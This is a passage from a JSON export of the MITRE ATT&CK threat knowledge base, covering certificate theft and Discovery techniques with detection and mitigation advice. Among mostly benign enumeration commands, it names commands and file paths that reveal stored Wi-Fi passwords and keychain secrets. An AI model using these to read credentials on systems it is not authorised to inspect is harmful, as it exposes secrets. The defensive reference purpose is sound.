Certificates","description":"Adversaries may steal or forge certificates used for authentication to access remote systems or resources. Digital certificates are often used to sign and encrypt messages and/or files. Certificates are also used as authentication material. For example, Entra ID device certificates and Active Directory Certificate Services (AD CS) certificates bind to an identity and can be used as credentials for domain accounts. <a href=\"https://o365blog.com/post/deviceidentity/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: O365 Blog Azure AD Device IDs)</a> <a href=\"https://docs.microsoft.com/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/hh831740(v=ws.11)\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft AD CS Overview)</a>\n\nAuthentication certificates can be both stolen and forged. For example, AD CS certificates can be stolen from encrypted storage (in the Registry or files) <a href=\"https://www.mandiant.com/resources/blog/apt29-windows-credential-roaming\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: APT29 Deep Look at Credential Roaming)</a>, misplaced certificate files (i.e. Unsecured Credentials), or directly from the Windows certificate store via various crypto APIs. <a href=\"https://web.archive.org/web/20220818094600/https://specterops.io/assets/resources/Certified_Pre-Owned.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: SpecterOps Certified Pre Owned)</a> <a href=\"https://github.com/TheWover/CertStealer\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: GitHub CertStealer)</a> <a href=\"https://github.com/GhostPack/SharpDPAPI#certificates\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: GitHub GhostPack Certificates)</a> With appropriate enrollment rights, users and/or machines within a domain can also request and/or manually renew certificates from enterprise certificate authorities (CA). This enrollment process defines various settings and permissions associated with the certificate. Of note, the certificate’s extended key usage (EKU) values define signing, encryption, and authentication use cases, while the certificate’s subject alternative name (SAN) values define the certificate owner’s alternate names. <a href=\"https://posts.specterops.io/certified-pre-owned-d95910965cd2\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Medium Certified Pre Owned)</a>\n\nAbusing certificates for authentication credentials may enable other behaviors such as Lateral Movement. Certificate-related misconfigurations may also enable opportunities for Privilege Escalation, by way of allowing users to impersonate or assume privileged accounts or permissions via the identities (SANs) associated with a certificate. These abuses may also enable Persistence via stealing or forging certificates that can be used as Valid Accounts for the duration of the certificate's validity, despite user password resets. Authentication certificates can also be stolen and forged for machine accounts.\n\nAdversaries who have access to root (or subordinate) CA certificate private keys (or mechanisms protecting/managing these keys) may also establish Persistence by forging arbitrary authentication certificates for the victim domain (known as “golden” certificates). <a href=\"https://posts.specterops.io/certified-pre-owned-d95910965cd2\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Medium Certified Pre Owned)</a> Adversaries may also target certificates and related services in order to access other forms of credentials, such as Golden Ticket ticket-granting tickets (TGT) or NTLM plaintext. <a href=\"https://posts.specterops.io/certified-pre-owned-d95910965cd2\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Medium Certified Pre Owned)</a>","detection":"","platforms":["Windows","Linux","macOS","Identity Provider"],"dataSources":["Command: Command Execution","Application Log: Application Log Content","Active Directory: Active Directory Credential Request","Active Directory: Active Directory Object Modification","Windows Registry: Windows Registry Key Access","File: File Access","Logon Session: Logon Session Creation"],"mitigations":[{"id":"M1015","name":"Active Directory Configuration","description":"Ensure certificate authorities (CA) are properly secured, including treating CA servers (and other resources hosting CA certificates) as tier 0 assets. Harden abusable CA settings and attributes.\n\nFor example, consider disabling the usage of AD CS certificate SANs within relevant authentication protocol settings to enforce strict user mappings and prevent certificates from authenticating as other identifies. <a href=\"https://web.archive.org/web/20220818094600/https://specterops.io/assets/resources/Certified_Pre-Owned.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: SpecterOps Certified Pre Owned)</a> Also consider enforcing CA Certificate Manager approval for the templates that include SAN as an issuance requirement."},{"id":"M1041","name":"Encrypt Sensitive Information","description":"Ensure certificates as well as associated private keys are appropriately secured. Consider utilizing additional hardware credential protections such as trusted platform modules (TPM) or hardware security modules (HSM). Enforce HTTPS and enable Extended Protection for\nAuthentication. <a href=\"https://web.archive.org/web/20220818094600/https://specterops.io/assets/resources/Certified_Pre-Owned.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: SpecterOps Certified Pre Owned)</a>"},{"id":"M1042","name":"Disable or Remove Feature or Program","description":"Consider disabling old/dangerous authentication protocols (e.g. NTLM), as well as unnecessary certificate features, such as potentially vulnerable AD CS web and other enrollment server roles. <a href=\"https://web.archive.org/web/20220818094600/https://specterops.io/assets/resources/Certified_Pre-Owned.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: SpecterOps Certified Pre Owned)</a>"},{"id":"M1047","name":"Audit","description":"Check and remediate unneeded existing authentication certificates as well as common abusable misconfigurations of CA settings and permissions, such as AD CS certificate enrollment permissions and published overly permissive certificate templates (which define available settings for created certificates). For example, available AD CS certificate templates can be checked via the Certificate Authority MMC snap-in (<code>certsrv.msc</code>). <code>certutil.exe</code> can also be used to examine various information within an AD CS CA database. <a href=\"https://web.archive.org/web/20220818094600/https://specterops.io/assets/resources/Certified_Pre-Owned.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: SpecterOps Certified Pre Owned)</a> <a href=\"https://github.com/GhostPack/PSPKIAudit\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: GitHub PSPKIAudit)</a> <a href=\"https://github.com/GhostPack/Certify/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: GitHub Certify)</a>"}],"subTechniques":[]}]},{"tactic":"Discovery","techniques":[{"id":"T1007","name":"System Service Discovery","description":"Adversaries may try to gather information about registered local system services. Adversaries may obtain information about services using tools as well as OS utility commands such as <code>sc query</code>, <code>tasklist /svc</code>, <code>systemctl --type=service</code>, and <code>net start</code>. Adversaries may also gather information about schedule tasks via commands such as <code>schtasks</code> on Windows or <code>crontab -l</code> on Linux and macOS. <a href=\"https://www.elastic.co/security-labs/under-the-sadbridge-with-gosar\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Elastic Security Labs GOSAR 2024)</a> <a href=\"https://www.sentinelone.com/labs/20-common-tools-techniques-used-by-macos-threat-actors-malware/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: SentinelLabs macOS Malware 2021)</a> <a href=\"https://www.splunk.com/en_us/blog/security/breaking-down-linux-gomir-understanding-this-backdoors-ttps.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Splunk Linux Gormir 2024)</a> <a href=\"https://www.aquasec.com/blog/threat-alert-kinsing-malware-container-vulnerability/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Aquasec Kinsing 2020)</a>\n\nAdversaries may use the information from System Service Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.","detection":"System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system information related to services. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as Windows Management Instrumentation and PowerShell.","platforms":["Linux","macOS","Windows"],"dataSources":["Command: Command Execution","Process: Process Creation","Process: OS API Execution"],"mitigations":[],"subTechniques":[]},{"id":"T1010","name":"Application Window Discovery","description":"Adversaries may attempt to get a listing of open application windows. Window listings could convey information about how the system is used. <a href=\"https://web.archive.org/web/20220629230035/https://www.prevailion.com/darkwatchman-new-fileless-techniques/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Prevailion DarkWatchman 2021)</a> For example, information about application windows could be used identify potential data to collect as well as identifying security tooling (Security Software Discovery) to evade. <a href=\"https://www.welivesecurity.com/2020/04/28/grandoreiro-how-engorged-can-exe-get/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: ESET Grandoreiro April 2020)</a>\n\nAdversaries typically abuse system features for this type of enumeration. For example, they may gather information through native system features such as Command and Scripting Interpreter commands and Native API functions.","detection":"System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as Windows Management Instrumentation and PowerShell.","platforms":["Linux","macOS","Windows"],"dataSources":["Process: Process Creation","Command: Command Execution","Process: OS API Execution"],"mitigations":[],"subTechniques":[]},{"id":"T1012","name":"Query Registry","description":"Adversaries may interact with the Windows Registry to gather information about the system, configuration, and installed software.\n\nThe Registry contains a significant amount of information about the operating system, configuration, software, and security. <a href=\"https://en.wikipedia.org/wiki/Windows_Registry\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Wikipedia Windows Registry)</a> Information can easily be queried using the Reg utility, though other means to access the Registry exist. Some of the information may help adversaries to further their operation within a network. Adversaries may use the information from Query Registry during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.","detection":"System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.\n\nInteraction with the Windows Registry may come from the command line using utilities such as Reg or through running malware that may interact with the Registry through an API. Command-line invocation of utilities used to query the Registry may be detected through process and command-line monitoring. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as Windows Management Instrumentation and PowerShell.","platforms":["Windows"],"dataSources":["Process: OS API Execution","Windows Registry: Windows Registry Key Access","Command: Command Execution","Process: Process Creation"],"mitigations":[],"subTechniques":[]},{"id":"T1016","name":"System Network Configuration Discovery","description":"Adversaries may look for details about the network configuration and settings, such as IP and/or MAC addresses, of systems they access or through information discovery of remote systems. Several operating system administration utilities exist that can be used to gather this information. Examples include Arp, ipconfig/ifconfig, nbtstat, and route.\n\nAdversaries may also leverage a Network Device CLI on network devices to gather information about configurations and settings, such as IP addresses of configured interfaces and static/dynamic routes (e.g. <code>show ip route</code>, <code>show ip interface</code>). <a href=\"https://www.us-cert.gov/ncas/alerts/TA18-106A\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: US-CERT-TA18-106A)</a> (Citation: Mandiant APT41 Global Intrusion ) On ESXi, adversaries may leverage esxcli to gather network configuration information. For example, the command <code>esxcli network nic list</code> will retrieve the MAC address, while <code>esxcli network ip interface ipv4 get</code> will retrieve the local IPv4 address. <a href=\"https://www.trellix.com/en-au/blogs/research/ransomhouse-am-see/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Trellix Rnasomhouse 2024)</a>\n\nAdversaries may use the information from System Network Configuration Discovery during automated discovery to shape follow-on behaviors, including determining certain access within the target network and what actions to do next.","detection":"System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Further, {{LinkById|T1059.008} commands may also be used to gather system and network information with built-in features native to the network device platform.  Monitor CLI activity for unexpected or unauthorized use  commands being run by non-standard users from non-standard locations.  Information may also be acquired through Windows system management tools such as Windows Management Instrumentation and PowerShell.","platforms":["ESXi","Linux","macOS","Network Devices","Windows"],"dataSources":["Command: Command Execution","Script: Script Execution","Process: Process Creation","Process: OS API Execution"],"mitigations":[],"subTechniques":[{"id":"T1016.001","name":"Internet Connection Discovery","description":"Adversaries may check for Internet connectivity on compromised systems. This may be performed during automated discovery and can be accomplished in numerous ways such as using Ping, <code>tracert</code>, and GET requests to websites, or performing initial speed testing to confirm bandwidth.\n\nAdversaries may use the results and responses from these requests to determine if the system is capable of communicating with their C2 servers before attempting to connect to them. The results may also be used to identify routes, redirectors, and proxy servers.","detection":"System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Command and Control, based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to check Internet connectivity.","platforms":["Windows","Linux","macOS","ESXi"],"dataSources":["Process: Process Creation","Command: Command Execution"],"mitigations":[]},{"id":"T1016.002","name":"Wi-Fi Discovery","description":"Adversaries may search for information about Wi-Fi networks, such as network names and passwords, on compromised systems. Adversaries may use Wi-Fi information as part of Account Discovery, Remote System Discovery, and other discovery or Credential Access activity to support both ongoing and future campaigns.\n\nAdversaries may collect various types of information about Wi-Fi networks from hosts. For example, on Windows names and passwords of all Wi-Fi networks a device has previously connected to may be available through <code>netsh wlan show profiles</code> to enumerate Wi-Fi names and then <code>netsh wlan show profile “Wi-Fi name” key=clear</code> to show a Wi-Fi network’s corresponding password. <a href=\"https://www.bleepingcomputer.com/news/security/hackers-steal-wifi-passwords-using-upgraded-agent-tesla-malware/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: BleepingComputer Agent Tesla steal wifi passwords)</a> <a href=\"https://www.malwarebytes.com/blog/news/2020/04/new-agenttesla-variant-steals-wifi-credentials\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Malware Bytes New AgentTesla variant steals WiFi credentials)</a> <a href=\"https://research.checkpoint.com/2022/apt35-exploits-log4j-vulnerability-to-distribute-new-modular-powershell-toolkit/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Check Point APT35 CharmPower January 2022)</a> Additionally, names and other details of locally reachable Wi-Fi networks can be discovered using calls to <code>wlanAPI.dll</code> Native API functions. <a href=\"https://www.binarydefense.com/resources/blog/emotet-evolves-with-new-wi-fi-spreader/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Binary Defense Emotes Wi-Fi Spreader)</a>\n\nOn Linux, names and passwords of all Wi-Fi-networks a device has previously connected to may be available in files under <code> /etc/NetworkManager/system-connections/</code>. <a href=\"https://www.geeksforgeeks.org/wi-fi-password-connected-networks-windowslinux/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Wi-Fi Password of All Connected Networks in Windows/Linux)</a> On macOS, the password of a known Wi-Fi may be identified with <code> security find-generic-password -wa wifiname</code> (requires admin username/password). <a href=\"https://mackeeper.com/blog/find-wi-fi-password-on-mac/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Find Wi-Fi Password on Mac)</a>","detection":"This type of attack technique cannot be easily mitigated with preventive controls since it is based on the abuse of system features.","platforms":["Linux","Windows","macOS"],"dataSources":["Process: OS API Execution","Command: Command Execution"],"mitigations":[]}]},{"id":"T1018","name":"Remote System Discovery","description":"Adversaries may attempt to get a listing of other systems by IP address, hostname, or other logical identifier on a network that may be used for Lateral Movement from the current system. Functionality could exist within remote access tools to enable this, but utilities available on the operating system could also be used such as  Ping, <code>net view</code> using Net, or, on ESXi servers, <code>esxcli network diag ping</code>.\n\nAdversaries may also analyze data from local host files (ex: <code>C:\\Windows\\System32\\Drivers\\etc\\hosts</code> or <code>/etc/hosts</code>) or other passive means (such as local Arp cache entries) in order to discover the presence of remote systems in an environment.\n\nAdversaries may also target discovery of network infrastructure as well as leverage Network Device CLI commands on network devices to gather detailed information about systems within a network (e.g. <code>show cdp neighbors</code>, <code>show arp</code>). <a href=\"https://www.us-cert.gov/ncas/alerts/TA18-106A\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: US-CERT-TA18-106A)</a> <a href=\"https://us-cert.cisa.gov/ncas/analysis-reports/ar21-126a\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: CISA AR21-126A FIVEHANDS May 2021)</a>","detection":"System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.\n\nNormal, benign system and network events related to legitimate remote system discovery may be uncommon, depending on the environment and how they are used. Monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as Windows Management Instrumentation and PowerShell.\n\nMonitor for processes that can be used to discover remote systems, such as <code>ping.exe</code> and <code>tracert.exe</code>, especially when executed in quick succession. <a href=\"https://www.elastic.co/blog/embracing-offensive-tooling-building-detections-against-koadic-using-eql\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Elastic - Koadiac Detection with EQL)</a>","platforms":["ESXi","Linux","macOS","Network Devices","Windows"],"dataSources":["Command: Command Execution","File: File Access","Network Traffic: Network Connection Creation","Process: Process Creation"],"mitigations":[],"subTechniques":[]},{"id":"T1033","name":"System Owner/User Discovery","description":"Adversaries may attempt to identify the primary user, currently logged in user, set of users that commonly uses a system, or whether a user is actively using the system. They may do this, for example, by retrieving account usernames or by using OS Credential Dumping. The information may be collected in a number of different ways using other Discovery techniques, because user and username details are prevalent throughout a system and include running process ownership, file/directory ownership, session information, and system logs. Adversaries may use the information from System Owner/User Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nVarious utilities and commands may acquire this information, including <code>whoami</code>. In macOS and Linux, the currently logged in user can be identified with <code>w</code> and <code>who</code>. On macOS the <code>dscl . list /Users | grep -v '_'</code> command can also be used to enumerate user accounts. Environment variables, such as <code>%USERNAME%</code> and <code>$USER</code>, may also be used to access this information.\n\nOn network devices, Network Device CLI commands such as <code>show users</code> and <code>show ssh</code> can be used to display users currently logged into the device. <a href=\"https://www.cisco.com/c/en/us/td/docs/ios-xml/ios/security/s1/sec-s1-cr-book/sec-cr-s5.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: show_ssh_users_cmd_cisco)</a> <a href=\"https://us-cert.cisa.gov/ncas/alerts/TA18-106A\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: US-CERT TA18-106A Network Infrastructure Devices 2018)</a>","detection":"<code>System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as Windows Management Instrumentation and PowerShell.\n\nFor network infrastructure devices, collect AAA logging to monitor </code>show` commands being run by non-standard users from non-standard locations.","platforms":["Linux","macOS","Network Devices","Windows"],"dataSources":["Active Directory: Active Directory Object Access","Process: OS API Execution","Command: Command Execution","Network Traffic: Network Traffic Content","Process: Process Creation","Network Traffic: Network Traffic Flow","Windows Registry: Windows Registry Key Access","File: File Access","Process: Process Access"],"mitigations":[],"subTechniques":[]},{"id":"T1040","name":"Network Sniffing","description":"Adversaries may passively sniff network traffic to capture information about an environment, including authentication material passed over the network. Network sniffing refers to using the network interface on a system to monitor or capture information sent over a wired or wireless connection. An adversary may place a network interface into promiscuous mode to passively access data in transit over the network, or use span ports to capture a larger amount of data.\n\nData captured via this technique may include user credentials, especially those sent over an insecure, unencrypted protocol. Techniques for name service resolution poisoning, such as Name Resolution Poisoning and SMB Relay, can also be used to capture credentials to websites, proxies, and internal systems by redirecting traffic to an adversary.\n\nNetwork sniffing may reveal configuration details, such as running services, version numbers, and other network characteristics (e.g. IP addresses, hostnames, VLAN IDs) necessary for subsequent Lateral Movement and/or Stealth activities. Adversaries may likely also utilize network sniffing during Adversary-in-the-Middle (AiTM) to passively gain additional knowledge about the environment.\n\nIn cloud-based environments, adversaries may still be able to use traffic mirroring services to sniff network traffic from virtual machines. For example, AWS Traffic Mirroring, GCP Packet Mirroring, and Azure vTap allow users to define specified instances to collect traffic from and specified targets to send collected traffic to. <a href=\"https://docs.aws.amazon.com/vpc/latest/mirroring/traffic-mirroring-how-it-works.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: AWS Traffic Mirroring)</a> <a href=\"https://cloud.google.com/vpc/docs/packet-mirroring\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: GCP Packet Mirroring)</a> <a href=\"https://docs.microsoft.com/en-us/azure/virtual-network/virtual-network-tap-overview\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Azure Virtual Network TAP)</a> Often, much of this traffic will be in cleartext due to the use of TLS termination at the load balancer level to reduce the strain of encrypting and decrypting traffic. <a href=\"https://rhinosecuritylabs.com/aws/abusing-vpc-traffic-mirroring-in-aws/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Rhino Security Labs AWS VPC Traffic Mirroring)</a> <a href=\"https://posts.specterops.io/through-the-looking-glass-part-1-f539ae308512\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: SpecterOps AWS Traffic Mirroring)</a> The adversary can then use exfiltration techniques such as Transfer Data to Cloud Account in order to access the sniffed traffic. <a href=\"https://rhinosecuritylabs.com/aws/abusing-vpc-traffic-mirroring-in-aws/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Rhino Security Labs AWS VPC Traffic Mirroring)</a>\n\nOn network devices, adversaries may perform network captures using Network Device CLI commands such as <code>monitor capture</code>. <a href=\"https://www.us-cert.gov/ncas/alerts/TA18-106A\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: US-CERT-TA18-106A)</a> <a href=\"https://www.cisco.com/c/en/us/support/docs/ios-nx-os-software/ios-embedded-packet-capture/116045-productconfig-epc-00.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: capture_embedded_packet_on_software)</a>","detection":"Detecting the events leading up to sniffing network traffic may be the best method of detection. From the host level, an adversary would likely need to perform a Adversary-in-the-Middle attack against other devices on a wired network in order to capture traffic that was not to or from the current compromised system. This change in the flow of information is detectable at the enclave network level. Monitor for ARP spoofing and gratuitous ARP broadcasts. Detecting compromised network devices is a bit more challenging. Auditing administrator logins, configuration changes, and device images is required to detect malicious changes.\n\nIn cloud-based environments, monitor for the creation of new traffic mirrors or modification of existing traffic mirrors. For network infrastructure devices, collect AAA logging to monitor for the capture of network traffic.","platforms":["IaaS","Linux","macOS","Network Devices","Windows"],"dataSources":["Command: Command Execution","Process: Process Creation"],"mitigations":[{"id":"M1018","name":"User Account Management","description":"In cloud environments, ensure that users are not granted permissions to create or modify traffic mirrors unless this is explicitly required."},{"id":"M1030","name":"Network Segmentation","description":"Deny direct access of broadcasts and multicast sniffing, and prevent attacks such as Name Resolution Poisoning and SMB Relay"},{"id":"M1032","name":"Multi-factor Authentication","description":"Use multi-factor authentication wherever possible."},{"id":"M1041","name":"Encrypt Sensitive Information","description":"Ensure that all wired and/or wireless traffic is encrypted appropriately. Use best practices for authentication protocols, such as Kerberos, and ensure web traffic that may contain credentials is protected by SSL/TLS."}],"subTechniques":[]},{"id":"T1046","name":"Network Service Discovery","description":"Adversaries may attempt to get a listing of services running on remote hosts and local network infrastructure devices, including those that may be vulnerable to remote software exploitation. Common methods to acquire this information include port, vulnerability, and/or wordlist scans using tools that are brought onto a system. <a href=\"https://us-cert.cisa.gov/ncas/analysis-reports/ar21-126a\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: CISA AR21-126A FIVEHANDS May 2021)</a>   \n\nWithin cloud environments, adversaries may attempt to discover services running on other cloud hosts. Additionally, if the cloud environment is connected to a on-premises environment, adversaries may be able to identify services running on non-cloud systems as well.\n\nWithin macOS environments, adversaries may use the native Bonjour application to discover services running on other macOS hosts within a network. The Bonjour mDNSResponder daemon automatically registers and advertises a host’s registered services on the network. For example, adversaries can use a mDNS query (such as <code>dns-sd -B _ssh._tcp .</code>) to find other systems broadcasting the ssh service. <a href=\"https://developer.apple.com/library/archive/documentation/Cocoa/Conceptual/NetServices/Introduction.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: apple doco bonjour description)</a> <a href=\"https://themittenmac.com/what-does-apt-activity-look-like-on-macos/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: macOS APT Activity Bradley)</a>","detection":"System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.\n\nNormal, benign system and network events from legitimate remote service scanning may be uncommon, depending on the environment and how they are used. Legitimate open port and vulnerability scanning may be conducted within the environment and will need to be deconflicted with any detection capabilities developed. Network intrusion detection systems can also be used to identify scanning activity. Monitor for process use of the networks and inspect intra-network flows to detect port scans.","platforms":["Containers","IaaS","Linux","macOS","Network Devices","Windows"],"dataSources":["Network Traffic: Network Traffic Flow","Command: Command Execution","Cloud Service: Cloud Service Enumeration"],"mitigations":[{"id":"M1030","name":"Network Segmentation","description":"Ensure proper network segmentation is followed to protect critical servers and devices."},{"id":"M1031","name":"Network Intrusion Prevention","description":"Use network intrusion detection/prevention systems to detect and prevent remote service scans."},{"id":"M1042","name":"Disable or Remove Feature or Program","description":"Ensure that unnecessary ports and services are closed to prevent risk of discovery and potential exploitation."}],"subTechniques":[]},{"id":"T1049","name":"System Network Connections Discovery","description":"Adversaries may attempt to get a listing of network connections to or from the compromised system they are currently accessing or from remote systems by querying for information over the network. \n\nAn adversary who gains access to a system that is part of a cloud-based environment may map out Virtual Private Clouds or Virtual Networks in order to determine what systems and services are connected. The actions performed are likely the same types of discovery techniques depending on the operating system, but the resulting information may include details about the networked cloud environment relevant to the adversary's goals. Cloud providers may have different ways in which their virtual networks operate. <a href=\"https://docs.aws.amazon.com/vpc/latest/userguide/what-is-amazon-vpc.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Amazon AWS VPC Guide)</a> <a href=\"https://docs.microsoft.com/en-us/azure/virtual-network/virtual-networks-overview\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Azure Virtual Network Overview)</a> <a href=\"https://cloud.google.com/vpc/docs/vpc\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Google VPC Overview)</a> Similarly, adversaries who gain access to network devices may also perform similar discovery activities to gather information about connected systems and services.\n\nUtilities and commands that acquire this information include netstat, \"net use,\" and \"net session\" with Net. In Mac and Linux, netstat and <code>lsof</code> can be used to list current connections. <code>who -a</code> and <code>w</code> can be used to show which users are currently logged in, similar to \"net session\". Additionally, built-in features native to network devices and Network Device CLI may be used (e.g. <code>show ip sockets</code>, <code>show tcp brief</code>). <a href=\"https://www.us-cert.gov/ncas/alerts/TA18-106A\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: US-CERT-TA18-106A)</a> On ESXi servers, the command <code>esxi network ip connection list</code> can be used to list active network connections. <a href=\"https://www.sygnia.co/blog/esxi-ransomware-ssh-tunneling-defense-strategies/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Sygnia ESXi Ransomware 2025)</a>","detection":"System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Further, Network Device CLI commands may also be used to gather system and network information with built-in features native to the network device platform.  Monitor CLI activity for unexpected or unauthorized use commands being run by non-standard users from non-standard locations. Information may also be acquired through Windows system management tools such as Windows Management Instrumentation and PowerShell.","platforms":["ESXi","IaaS","Linux","macOS","Network Devices","Windows"],"dataSources":["Process: OS API Execution","Process: Process Creation","Command: Command Execution"],"mitigations":[],"subTechniques":[]},{"id":"T1057","name":"Process Discovery","description":"Adversaries may attempt to get information about running processes on a system. Information obtained could be used to gain an understanding of common software/applications running on systems within the network. Administrator or otherwise elevated access may provide better process details. Adversaries may use the information from Process Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nIn Windows environments, adversaries could obtain details on running processes using the Tasklist utility via cmd or <code>Get-Process</code> via PowerShell. Information about processes can also be extracted from the output of Native API calls such as <code>CreateToolhelp32Snapshot</code>. In Mac and Linux, this is accomplished with the <code>ps</code> command. Adversaries may also opt to enumerate processes via <code>/proc</code>. ESXi also supports use of the <code>ps</code> command, as well as <code>esxcli system process list</code>. <a href=\"https://www.sygnia.co/blog/esxi-ransomware-ssh-tunneling-defense-strategies/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Sygnia ESXi Ransomware 2025)</a> <a href=\"https://www.crowdstrike.com/en-us/blog/hypervisor-jackpotting-ecrime-actors-increase-targeting-of-esxi-servers/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Crowdstrike Hypervisor Jackpotting Pt 2 2021)</a>\n\nOn network devices, Network Device CLI commands such as <code>show processes</code> can be used to display current running processes. <a href=\"https://www.us-cert.gov/ncas/alerts/TA18-106A\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: US-CERT-TA18-106A)</a> <a href=\"https://www.cisco.com/c/en/us/td/docs/ios-xml/ios/fundamentals/command/cf_command_ref/show_monitor_permit_list_through_show_process_memory.html#wp3599497760\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: show_processes_cisco_cmd)</a>","detection":"System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.\n\nNormal, benign system and network events that look like process discovery may be uncommon, depending on the environment and how they are used. Monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as Windows Management Instrumentation and PowerShell.\n\nFor network infrastructure devices, collect AAA logging to monitor for <code>show</code> commands being run by non-standard users from non-standard locations.","platforms":["ESXi","Linux","macOS","Network Devices","Windows"],"dataSources":["Process: Process Creation","Process: OS API Execution","Command: Command 